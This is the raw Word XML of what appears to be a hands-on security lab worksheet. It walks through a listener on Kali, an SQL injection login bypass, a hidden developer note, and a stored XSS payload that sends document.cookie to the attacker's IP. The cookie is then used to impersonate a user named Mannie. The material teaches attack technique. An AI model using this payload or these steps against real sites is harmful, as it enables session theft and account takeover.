        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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y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hon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ser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v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er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 xml:space="preserve">– </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">o 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ch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olen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 xml:space="preserve">in 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 xml:space="preserve">l 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spacing w:val="-3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me</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="51"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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si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n Hij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 xml:space="preserve">cking – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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o im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erso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 xml:space="preserve">e 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er u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er</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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S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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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ep-b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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>y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-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>S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 xml:space="preserve">tep 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>In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st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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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t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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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ons</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="14" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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1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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Clo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 xml:space="preserve">e all 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>w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indo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>w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A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i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n Kali</w:t>
      </w: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 xml:space="preserve">to </w:t>
      </w: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lear any</w:t>
      </w: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liste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>n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ers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A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o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r ru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>n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ning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 xml:space="preserve"> p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ro</w:t>
      </w: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es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="20"/>
        <w:ind w:left="1440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2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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Start</w:t>
      </w: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Monitoring for E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>x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fi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l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tra</w:t>
      </w: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t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ion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="7651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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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On K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li,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op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 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erm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l.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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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St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new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TT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lis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ener:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo python3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m http.ser</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>er 80</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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3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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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A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nal</w:t>
      </w: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y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>z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e the Web Interf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a</w:t>
      </w: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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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La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ch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Fire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ox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nd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v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ig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e to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he we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si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e login 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g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e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19" w:line="260" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="3872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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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V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iew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he pa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g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e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ce.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You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sh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uld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obser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v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e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o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nu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l in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ormat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. c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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e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QL 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njecti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n to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y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log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n.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Once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log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g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ed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n, v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ew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e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of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e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ge.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="19"/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e.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="25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Look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or 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eve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oper no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ere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cing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nn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e_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.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php:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="180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6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-- dev note: restricted content being moved to mannie_docs.php -</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="17"/>
          <w:szCs w:val="17"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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.   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="18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y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v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isiting /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nn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_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.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php. Y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u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ho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ei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v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 "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cc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eni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."</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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4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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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Steal a Se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>ss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ion Cookie U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ing XSS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="258" w:lineRule="auto"/>
        <w:ind w:left="1800" w:right="481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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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v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igate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 the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"Leave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ser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v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io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or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m" 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ge.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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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ubmit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his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X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y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(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 li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e):</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="259" w:lineRule="auto"/>
        <w:ind w:left="2520" w:right="427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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>&lt;p&gt;Great job, team!&lt;/p&gt;&lt;script&gt;new Image().src="http://&lt;kali_IP&gt;/?cookie="</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>+ document.cookie;&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="9" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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c.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="37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Log out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of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 we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si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XSS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o log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k in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gain.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="21" w:line="258" w:lineRule="auto"/>
        <w:ind w:left="2160" w:right="1412" w:hanging="36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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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v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igate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 O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er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v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io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nd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e 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b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y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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min.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uld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ig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g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er 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he XSS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d your c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okie in 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he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ckg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und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 the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K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li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ener.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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e.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="25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etu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 to your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K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li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erm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in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l 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v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eri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y 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 list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ner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eceiv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kie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440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5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 xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="38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I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>mp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er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onate Mannie</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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p listener 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epare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or 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other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ok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 c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ur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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="39"/>
        <w:ind w:left="252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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">sudo python3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m http.server 80</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="180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.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2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On your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 w:rsidRPr="00FA45BE">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ho</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA45BE">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00FA45BE">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040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P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C,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open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ow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er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nd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og in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o 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he ta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get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we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si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4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s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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-3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CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/ c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="CC6600"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
